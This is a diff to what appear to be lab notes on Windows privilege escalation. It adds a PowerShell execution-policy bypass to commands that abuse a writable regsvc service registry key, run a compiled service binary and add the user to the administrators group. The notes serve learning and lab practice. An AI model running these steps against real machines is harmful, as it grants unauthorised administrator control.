@@ -364,8 +364,10 @@ run
 ```shell
 #regsvc
 #in victim powershell
+powershell -ep bypass
 Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
-#output shows that user belongs to 'Interactive' and has 'full control' over registry key
+#output shows that user belongs to 'Interactive' and has 'full control' over registry key see picture
+
 
 #copy the required source file, windows_service.c to attacker machine
 
@@ -388,6 +390,7 @@ sc start regsvc
 net localgroup administrators
 #our user is added to administrators group
 ```
+![image](https://github.com/user-attachments/assets/eb03d49d-ea00-4232-98a0-38460c2791fc)
 
 ## Executable Files
 
